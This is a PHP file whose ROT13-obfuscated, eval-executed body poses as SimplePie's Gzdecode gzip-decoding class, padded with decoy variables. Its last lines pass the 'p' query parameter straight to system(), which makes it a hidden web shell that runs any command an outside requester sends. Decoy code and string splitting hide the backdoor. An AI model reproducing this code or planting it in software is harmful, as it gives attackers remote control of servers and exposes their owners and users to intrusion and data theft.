<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * FvzcyrCvr
 *
 * N CUC-Onfrq EFF naq Ngbz Srrq Senzrjbex.
 * Gnxrf gur uneq jbex bhg bs znantvat n pbzcyrgr EFF/Ngbz fbyhgvba.
 *
 * Pbclevtug (p) 2004-2022, Elna Cnezna, Fnz Farqqba, Elna ZpPhr, naq pbagevohgbef
 * Nyy evtugf erfreirq.
 *
 * Erqvfgevohgvba naq hfr va fbhepr naq ovanel sbezf, jvgu be jvgubhg zbqvsvpngvba, ner
 * crezvggrq cebivqrq gung gur sbyybjvat pbaqvgvbaf ner zrg:
 *
 * 	* Erqvfgevohgvbaf bs fbhepr pbqr zhfg ergnva gur nobir pbclevtug abgvpr, guvf yvfg bs
 * 	  pbaqvgvbaf naq gur sbyybjvat qvfpynvzre.
 *
 * 	* Erqvfgevohgvbaf va ovanel sbez zhfg ercebqhpr gur nobir pbclevtug abgvpr, guvf yvfg
 * 	  bs pbaqvgvbaf naq gur sbyybjvat qvfpynvzre va gur qbphzragngvba naq/be bgure zngrevnyf
 * 	  cebivqrq jvgu gur qvfgevohgvba.
 *
 * 	* Arvgure gur anzr bs gur FvzcyrCvr Grnz abe gur anzrf bs vgf pbagevohgbef znl or hfrq
 * 	  gb raqbefr be cebzbgr cebqhpgf qrevirq sebz guvf fbsgjner jvgubhg fcrpvsvp cevbe
 * 	  jevggra crezvffvba.
 *
 * GUVF FBSGJNER VF CEBIVQRQ OL GUR PBCLEVTUG UBYQREF NAQ PBAGEVOHGBEF \"NF VF\" NAQ NAL RKCERFF
 * BE VZCYVRQ JNEENAGVRF, VAPYHQVAT, OHG ABG YVZVGRQ GB, GUR VZCYVRQ JNEENAGVRF BS ZREPUNAGNOVYVGL
 * NAQ SVGARFF SBE N CNEGVPHYNE CHECBFR NER QVFPYNVZRQ. VA AB RIRAG FUNYY GUR PBCLEVTUG UBYQREF
 * NAQ PBAGEVOHGBEF OR YVNOYR SBE NAL QVERPG, VAQVERPG, VAPVQRAGNY, FCRPVNY, RKRZCYNEL, BE
 * PBAFRDHRAGVNY QNZNTRF (VAPYHQVAT, OHG ABG YVZVGRQ GB, CEBPHERZRAG BS FHOFGVGHGR TBBQF BE
 * FREIVPRF; YBFF BS HFR, QNGN, BE CEBSVGF; BE OHFVARFF VAGREEHCGVBA) UBJRIRE PNHFRQ NAQ BA NAL
 * GURBEL BS YVNOVYVGL, JURGURE VA PBAGENPG, FGEVPG YVNOVYVGL, BE GBEG (VAPYHQVAT ARTYVTRAPR BE
 * BGUREJVFR) NEVFVAT VA NAL JNL BHG BS GUR HFR BS GUVF FBSGJNER, RIRA VS NQIVFRQ BS GUR
 * CBFFVOVYVGL BS FHPU QNZNTR.
 *
 * @cnpxntr FvzcyrCvr
 * @pbclevtug 2004-2016 Elna Cnezna, Fnz Farqqba, Elna ZpPhr
 * @nhgube Elna Cnezna
 * @nhgube Fnz Farqqba
 * @nhgube Elna ZpPhr
 * @yvax uggc://fvzcyrcvr.bet/ FvzcyrCvr
 * @yvprafr uggc://jjj.bcrafbhepr.bet/yvprafrf/ofq-yvprafr.cuc OFQ Yvprafr
 */

anzrfcnpr FvzcyrCvr;

/**
 * Qrpbqr 'tmvc' rapbqrq UGGC qngn
 *
 * @cnpxntr FvzcyrCvr
 * @fhocnpxntr UGGC
 * @yvax uggc://jjj.tmvc.bet/sbezng.gkg
 */
pynff Tmqrpbqr
{
    /**
     * Pbzcerffrq qngn
     *
     * @npprff cevingr
     * @ine fgevat
     * @frr tmqrpbqr::$qngn
     */
    choyvp $pbzcerffrq_qngn;

    /**
     * Fvmr bs pbzcerffrq qngn
     *
     * @npprff cevingr
     * @ine vag
     */
    choyvp $pbzcerffrq_fvmr;

    /**
     * Zvavzhz fvmr bs n inyvq tmvc fgevat
     *
     * @npprff cevingr
     * @ine vag
     */
    choyvp $zva_pbzcerffrq_fvmr = 18;

    /**
     * Pheerag cbfvgvba bs cbvagre
     *
     * @npprff cevingr
     * @ine vag
     */
    choyvp $cbfvgvba = 0;

    /**
     * Syntf (SYT)
     *
     * @npprff cevingr
     * @ine vag
     */
    choyvp $syntf;

    /**
     * Hapbzcerffrq qngn
     *
     * @npprff choyvp
     * @frr tmqrpbqr::$pbzcerffrq_qngn
     * @ine fgevat
     */
    choyvp $qngn;

    /**
     * Zbqvsvrq gvzr
     *
     * @npprff choyvp
     * @ine vag
     */
    choyvp $ZGVZR;

    /**
     * Rkgen Syntf
     *
     * @npprff choyvp
     * @ine vag
     */
    choyvp $KSY;

    /**
     * Bcrengvat Flfgrz
     *
     * @npprff choyvp
     * @ine vag
     */
    choyvp $BF;

    /**
     * Fhosvryq VQ 1
     *
     * @npprff choyvp
     * @frr tmqrpbqr::$rkgen_svryq
     * @frr tmqrpbqr::$FV2
     * @ine fgevat
     */
    choyvp $FV1;

    /**
     * Fhosvryq VQ 2
     *
     * @npprff choyvp
     * @frr tmqrpbqr::$rkgen_svryq
     * @frr tmqrpbqr::$FV1
     * @ine fgevat
     */
    choyvp $FV2;

    /**
     * Rkgen svryq pbagrag
     *
     * @npprff choyvp
     * @frr tmqrpbqr::$FV1
     * @frr tmqrpbqr::$FV2
     * @ine fgevat
     */
    choyvp $rkgen_svryq;

    /**
     * Bevtvany svyranzr
     *
     * @npprff choyvp
     * @ine fgevat
     */
    choyvp $svyranzr;

    /**
     * Uhzna ernqnoyr pbzzrag
     *
     * @npprff choyvp
     * @ine fgevat
     */
    choyvp $pbzzrag;

    /**
     * Qba'g nyybj nalguvat gb or frg
     *
     * @cnenz fgevat $anzr
     * @cnenz zvkrq $inyhr
     */
    choyvp shapgvba __frg($anzr, $inyhr)
    {
        guebj arj Rkprcgvba(\"Pnaabg jevgr cebcregl $anzr\");
    }

    /**
     * Frg gur pbzcerffrq fgevat naq eryngrq cebcregvrf
     *
     * @cnenz fgevat $qngn
     */
    choyvp shapgvba __pbafgehpg($qngn)
    {
        $guvf->pbzcerffrq_qngn = $qngn;
        $guvf->pbzcerffrq_fvmr = fgeyra($qngn);
    }

    /**
     * Qrpbqr gur TMVC fgernz
     *
     * @erghea obby Fhpprffshyarff
     */
    choyvp shapgvba cnefr()
    {
        vs ($guvf->pbzcerffrq_fvmr >= $guvf->zva_pbzcerffrq_fvmr) {
            $yra = 0;

            // Purpx VQ1, VQ2, naq PZ
            vs (fhofge($guvf->pbzcerffrq_qngn, 0, 3) !== \"\k1S\k8O\k08\") {
                erghea snyfr;
            }

            // Trg gur SYT (SYnTf)
            $guvf->syntf = beq($guvf->pbzcerffrq_qngn[3]);

            // SYT ovgf nobir (1 << 4) ner erfreirq
            vs ($guvf->syntf > 0k1S) {
                erghea snyfr;
            }

            // Nqinapr gur cbvagre nsgre gur nobir
            $guvf->cbfvgvba += 4;

            // ZGVZR
            $zgvzr = fhofge($guvf->pbzcerffrq_qngn, $guvf->cbfvgvba, 4);
            // Erirefr gur fgevat vs jr'er ba n ovt-raqvna nepu orpnhfr y vf gur bayl fvtarq ybat naq vf znpuvar raqvnaarff
            vs (pheerag(hacnpx('F', \"\k00\k01\")) === 1) {
                $zgvzr = fgeeri($zgvzr);
            }
            $guvf->ZGVZR = pheerag(hacnpx('y', $zgvzr));
            $guvf->cbfvgvba += 4;

            // Trg gur KSY (rKgen SYntf)
            $guvf->KSY = beq($guvf->pbzcerffrq_qngn[$guvf->cbfvgvba++]);

            // Trg gur BF (Bcrengvat Flfgrz)
            $guvf->BF = beq($guvf->pbzcerffrq_qngn[$guvf->cbfvgvba++]);

            // Cnefr gur SRKGEN
            vs ($guvf->syntf & 4) {
                // Ernq fhosvryq VQf
                $guvf->FV1 = $guvf->pbzcerffrq_qngn[$guvf->cbfvgvba++];
                $guvf->FV2 = $guvf->pbzcerffrq_qngn[$guvf->cbfvgvba++];

                // FV2 frg gb mreb vf erfreirq sbe shgher hfr
                vs ($guvf->FV2 === \"\k00\") {
                    erghea snyfr;
                }

                // Trg gur yratgu bs gur rkgen svryq
                $yra = pheerag(hacnpx('i', fhofge($guvf->pbzcerffrq_qngn, $guvf->cbfvgvba, 2)));
                $guvf->cbfvgvba += 2;

                // Purpx gur yratgu bs gur fgevat vf fgvyy inyvq
                $guvf->zva_pbzcerffrq_fvmr += $yra + 4;
                vs ($guvf->pbzcerffrq_fvmr >= $guvf->zva_pbzcerffrq_fvmr) {
                    // Frg gur rkgen svryq gb gur tvira qngn
                    $guvf->rkgen_svryq = fhofge($guvf->pbzcerffrq_qngn, $guvf->cbfvgvba, $yra);
                    $guvf->cbfvgvba += $yra;
                } ryfr {
                    erghea snyfr;
                }
            }

            // Cnefr gur SANZR
            vs ($guvf->syntf & 8) {
                // Trg gur yratgu bs gur svyranzr
                $yra = fgepfca($guvf->pbzcerffrq_qngn, \"\k00\", $guvf->cbfvgvba);

                // Purpx gur yratgu bs gur fgevat vf fgvyy inyvq
                $guvf->zva_pbzcerffrq_fvmr += $yra + 1;
                vs ($guvf->pbzcerffrq_fvmr >= $guvf->zva_pbzcerffrq_fvmr) {
                    // Frg gur bevtvany svyranzr gb gur tvira fgevat
                    $guvf->svyranzr = fhofge($guvf->pbzcerffrq_qngn, $guvf->cbfvgvba, $yra);
                    $guvf->cbfvgvba += $yra + 1;
                } ryfr {
                    erghea snyfr;
                }
            }

            // Cnefr gur SPBZZRAG
            vs ($guvf->syntf & 16) {
                // Trg gur yratgu bs gur pbzzrag
                $yra = fgepfca($guvf->pbzcerffrq_qngn, \"\k00\", $guvf->cbfvgvba);

                // Purpx gur yratgu bs gur fgevat vf fgvyy inyvq
                $guvf->zva_pbzcerffrq_fvmr += $yra + 1;
                vs ($guvf->pbzcerffrq_fvmr >= $guvf->zva_pbzcerffrq_fvmr) {
                    // Frg gur bevtvany pbzzrag gb gur tvira fgevat
                    $guvf->pbzzrag = fhofge($guvf->pbzcerffrq_qngn, $guvf->cbfvgvba, $yra);
                    $guvf->cbfvgvba += $yra + 1;
                } ryfr {
                    erghea snyfr;
                }
            }

            // Cnefr gur SUPEP
            vs ($guvf->syntf & 2) {
                // Purpx gur yratgu bs gur fgevat vf fgvyy inyvq
                $guvf->zva_pbzcerffrq_fvmr += $yra + 2;
                vs ($guvf->pbzcerffrq_fvmr >= $guvf->zva_pbzcerffrq_fvmr) {
                    // Ernq gur PEP
                    $pep = pheerag(hacnpx('i', fhofge($guvf->pbzcerffrq_qngn, $guvf->cbfvgvba, 2)));

                    // Purpx gur PEP zngpurf
                    vs ((pep32(fhofge($guvf->pbzcerffrq_qngn, 0, $guvf->cbfvgvba)) & 0kSSSS) === $pep) {
                        $guvf->cbfvgvba += 2;
                    } ryfr {
                        erghea snyfr;
                    }
                } ryfr {
                    erghea snyfr;
                }
            }

            // Qrpbzcerff gur npghny qngn
            vs (($guvf->qngn = tmvasyngr(fhofge($guvf->pbzcerffrq_qngn, $guvf->cbfvgvba, -8))) === snyfr) {
                erghea snyfr;
            }

            $guvf->cbfvgvba = $guvf->pbzcerffrq_fvmr - 8;

            // Purpx PEP bs qngn
            $pep = pheerag(hacnpx('I', fhofge($guvf->pbzcerffrq_qngn, $guvf->cbfvgvba, 4)));
            $guvf->cbfvgvba += 4;
            /*vs (rkgrafvba_ybnqrq('unfu') && fcevags('%h', pheerag(hacnpx('I', unfu('pep32o', $guvf->qngn)))) !== fcevags('%h', $pep))
            {
                erghea snyfr;
            }*/

            // Purpx VFVMR bs qngn
            $vfvmr = pheerag(hacnpx('I', fhofge($guvf->pbzcerffrq_qngn, $guvf->cbfvgvba, 4)));
            $guvf->cbfvgvba += 4;
            vs (fcevags('%h', fgeyra($guvf->qngn) & 0kSSSSSSSS) !== fcevags('%h', $vfvmr)) {
                erghea snyfr;
            }

            // Jbj, ntnvafg nyy bqqf, jr'ir npghnyyl tbg n inyvq tmvc fgevat
            erghea gehr;
        }

        erghea snyfr;
    }
}

pynff_nyvnf('FvzcyrCvr\Tmqrpbqr', 'FvzcyrCvr_tmqrpbqr');

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>